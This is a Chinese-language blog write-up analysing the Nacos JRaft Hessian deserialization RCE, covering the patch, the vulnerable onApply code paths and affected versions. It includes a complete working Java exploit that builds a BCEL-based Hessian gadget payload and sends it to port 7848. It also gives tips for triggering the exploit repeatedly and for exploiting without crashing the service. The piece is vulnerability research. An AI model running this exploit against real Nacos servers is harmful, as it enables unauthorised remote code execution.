title: Nacos Jraft Hessian反序列化RCE分析
author: bmth
tags:
  - Nacos
categories:
  - java
top_img: 'https://img-blog.csdnimg.cn/a195198364054a8a89884e9b8262229c.png'
cover: 'https://img-blog.csdnimg.cn/a195198364054a8a89884e9b8262229c.png'
date: 2023-06-14 21:32:00
---
![](https://img-blog.csdnimg.cn/a195198364054a8a89884e9b8262229c.png)

在Nacos 2.2.3版本中，修复了一个hessian反序列化漏洞
![](https://img-blog.csdnimg.cn/c44bd89483204210b31e2a957c9224f3.png)

该漏洞主要是针对部分Jraft请求处理时，使用hessian进行反序列化未限制而造成的RCE漏洞

影响版本：
- 1.4.0 <= Nacos < 1.4.6  使用cluster集群模式运行
- 2.0.0 <= Nacos < 2.2.3  任意模式启动均受到影响

## 漏洞分析
看到漏洞修复：[https://github.com/alibaba/nacos/pull/10542/files](https://github.com/alibaba/nacos/pull/10542/files)
`com.alibaba.nacos.consistency.serialize.HessianSerializer`
![](https://img-blog.csdnimg.cn/4096f081e0a44013be87b94ae7fe0eac.png)

使用 NacosHessianSerializerFactory 代替了默认的 SerializerFactory，而这是一个白名单类，相当于从根源上解决了反序列化问题

继续看到其他改动可以发现
![](https://img-blog.csdnimg.cn/dc2a47e60a1e43ce8a03258b3f29def1.png)

主要就是在onApply、onRequest方法会触发serializer.deserialize反序列化，对如下几个类做了修改：
```
com.alibaba.nacos.naming.consistency.persistent.impl.BasePersistentServiceProcessor
com.alibaba.nacos.naming.core.v2.metadata.InstanceMetadataProcessor
com.alibaba.nacos.naming.core.v2.metadata.ServiceMetadataProcessor
com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl
com.alibaba.nacos.config.server.service.repository.embedded.DistributedDatabaseOperateImpl
```
该漏洞的关键就是如何传参到7848端口的 JRaft 实现rce，主要看到官方文档：[JRaft 用户指南](https://www.sofastack.tech/projects/sofa-jraft/jraft-user-guide/)

客户端的通讯层都依赖 Bolt 的 RpcClient，封装在 CliClientService 接口中，实现类就是 BoltCliClientService 。 可以通过 BoltCliClientService 的 getRpcClient 方法获取底层的 bolt RpcClient 实例，用于其他通讯用途，做到资源复用

提交的任务最终将会复制应用到所有 raft 节点上的状态机，状态机通过 StateMachine 接口表示，`void onApply(Iterator iter)`是它最核心的方法，应用任务列表到状态机，任务将按照提交顺序应用

所以说会走到`com.alibaba.nacos.core.distributed.raft.NacosStateMachine#onApply`
![](https://img-blog.csdnimg.cn/fc95b8c6351d407cb5a6f6f9fa549217.png)

如果message为 WriteRequest 的实例，那么就会调用 processor 的 onApply 方法，processor 的实现类如下：
![](https://img-blog.csdnimg.cn/b946f6e1f2ab4e7c8000a69c50358a01.png)

看到`com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl#onApply`
![](https://img-blog.csdnimg.cn/a5c0871a0fec4fe6b736cb7dc2d19824.png)

很明显调用了反序列化
注意这里有个`com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl#group`
![](https://img-blog.csdnimg.cn/05d5ce75554943b0866a68745d72c2e8.png)

group() 方法会作为 groupName 用于创建RaftGroupService
## 漏洞利用
虽然说nacos中集成了hessian-3.3.6.jar和hessian-4.0.63.jar，但还是会优先使用hessian-4.0.63进行反序列化，而这个版本中存在黑名单
![](https://img-blog.csdnimg.cn/737c8bb1667b4b38bf437a137beb72ca.png)

ban掉了如下这几个类：
```
java.lang.Runtime
java.lang.Process
java.lang.System
java.lang.Thread
```
所以不能用MethodUtil来打Runtime，我们可以使用`com.sun.org.apache.bcel.internal.util.JavaWrapper`加载bcel字节码实现rce

最后的exp：
```java
import com.alibaba.nacos.consistency.entity.WriteRequest;
import com.alipay.sofa.jraft.entity.PeerId;
import com.alipay.sofa.jraft.option.CliOptions;
import com.alipay.sofa.jraft.rpc.impl.GrpcClient;
import com.alipay.sofa.jraft.rpc.impl.MarshallerHelper;
import com.alipay.sofa.jraft.rpc.impl.cli.CliClientServiceImpl;
import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.SerializerFactory;
import com.google.protobuf.*;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import sun.swing.SwingLazyValue;

import javax.swing.*;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class exp
{
    public static void main( String[] args ) throws Exception {
        String address = "192.168.111.178:7848";
        byte[] poc = build();

        //初始化 RPC 服务
        CliClientServiceImpl cliClientService = new CliClientServiceImpl();
        cliClientService.init(new CliOptions());
        PeerId leader = PeerId.parsePeer(address);

        WriteRequest request = WriteRequest.newBuilder()
                .setGroup("naming_persistent_service_v2")
                .setData(ByteString.copyFrom(poc))
                .build();

        GrpcClient grpcClient = (GrpcClient) cliClientService.getRpcClient();

        //反射添加WriteRequest，不然会抛出异常
        Field parserClassesField = GrpcClient.class.getDeclaredField("parserClasses");
        parserClassesField.setAccessible(true);
        Map<String, Message> parserClasses = (Map) parserClassesField.get(grpcClient);
        parserClasses.put(WriteRequest.class.getName(),WriteRequest.getDefaultInstance());
        MarshallerHelper.registerRespInstance(WriteRequest.class.getName(),WriteRequest.getDefaultInstance());

        Object res = grpcClient.invokeSync(leader.getEndpoint(), request,5000);
        System.out.println(res);
    }

    private static byte[] build() throws Exception {
        JavaClass evil = Repository.lookupClass(calc.class);
        String payload = "$$BCEL$$" + Utility.encode(evil.getBytes(), true);

        SwingLazyValue slz = new SwingLazyValue("com.sun.org.apache.bcel.internal.util.JavaWrapper", "_main", new Object[]{new String[]{payload}});
        UIDefaults uiDefaults1 = new UIDefaults();
        uiDefaults1.put("_", slz);
        UIDefaults uiDefaults2 = new UIDefaults();
        uiDefaults2.put("_", slz);

        HashMap hashMap = makeMap(uiDefaults1,uiDefaults2);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output oo = new Hessian2Output(baos);
        oo.setSerializerFactory(new SerializerFactory());
        oo.getSerializerFactory().setAllowNonSerializable(true);
        oo.writeObject(hashMap);
        oo.flush();

        return baos.toByteArray();
    }

    public static HashMap<Object, Object> makeMap ( Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        setFieldValue(s, "table", tbl);
        return s;
    }
    public static void setFieldValue(Object obj, String name, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```
部分调用栈如下：
```
deseiralize0:69, HessianSerializer (com.alibaba.nacos.consistency.serialize)
deserialize:47, HessianSerializer (com.alibaba.nacos.consistency.serialize)
onApply:188, PersistentClientOperationServiceImpl (com.alibaba.nacos.naming.core.v2.service.impl)
onApply:122, NacosStateMachine (com.alibaba.nacos.core.distributed.raft)
doApplyTasks:541, FSMCallerImpl (com.alipay.sofa.jraft.core)
doCommitted:510, FSMCallerImpl (com.alipay.sofa.jraft.core)
runApplyTask:442, FSMCallerImpl (com.alipay.sofa.jraft.core)
access$100:73, FSMCallerImpl (com.alipay.sofa.jraft.core)
onEvent:148, FSMCallerImpl$ApplyTaskHandler (com.alipay.sofa.jraft.core)
onEvent:142, FSMCallerImpl$ApplyTaskHandler (com.alipay.sofa.jraft.core)
run:137, BatchEventProcessor (com.lmax.disruptor)
run:750, Thread (java.lang)
```
但是bcel在jdk8u251被删除了，所以高版本下需要其他的利用方式

根据y4er师傅的文章，nacos存在jackson依赖，可以打JNDI，配合jackson POJONode的反序列化rce，但是测试发现打jackson不太稳定，跟环境有关系

### 多次触发
在第二次执行exp的时候会报错：
```
key: "Could not find leader : naming_persistent_service_v2"
```
这里由于第一次攻击会导致 raft 记录的集群地址失效

我们需要删除 Nacos 根目录下 data 文件夹下的 protocol 文件夹，然后重启服务才能恢复

看到`com.alibaba.nacos.core.distributed.raft.JRaftServer#createMultiRaftGroup`创建RaftGroupService的地方
![](https://img-blog.csdnimg.cn/ab59f84e5e2e44b8a82d1b0c5b75c971.png)
![](https://img-blog.csdnimg.cn/03f5b690921e45ef8f127fba68cf46c2.png)
![](https://img-blog.csdnimg.cn/699becd25c4f43c6a45a846b92e8660a.png)

我们可以根据 group 打不同的 RaftGroupService：
```
naming_persistent_service_v2
naming_instance_metadata
naming_service_metadata
```
所以说至少可以打三次

### 无损利用
第一次执行exp的时候会报错：
```
key: "java.lang.ClassCastException: java.util.HashMap cannot be cast to com.alibaba.nacos.naming.core.v2.metadata.MetadataOperation"
```
类型转换异常，导致的服务出错

发现 MetadataOperation 这个对象有一个属性 metadata 是泛型，并且实现了 Serializable 接口
![](https://img-blog.csdnimg.cn/8397f1b5c6e748639760ffa85b0c63d6.png)

我们可以构造一个 MetadataOperation 对象，并将其 metadata 属性设置恶意对象，此时反序列化后的对象符合预期，不会报错，服务就会正常运行
```java
MetadataOperation metadataOperation = new MetadataOperation();
setFieldValue(metadataOperation,"metadata",hashMap);
```

参考：
[漏洞风险提示｜Nacos Jraft Hessian反序列化漏洞](https://mp.weixin.qq.com/s/0J0K0iY3bcmYcOuPGymAlQ)
[Nacos Hessian 反序列化 RCE](https://y4er.com/posts/nacos-hessian-rce/)
[Nacos Raft Hessian反序列化漏洞分析](https://l3yx.github.io/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)
[Nacos JRaft Hessian 反序列化分析](https://exp.ci/2023/06/14/Nacos-JRaft-Hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/)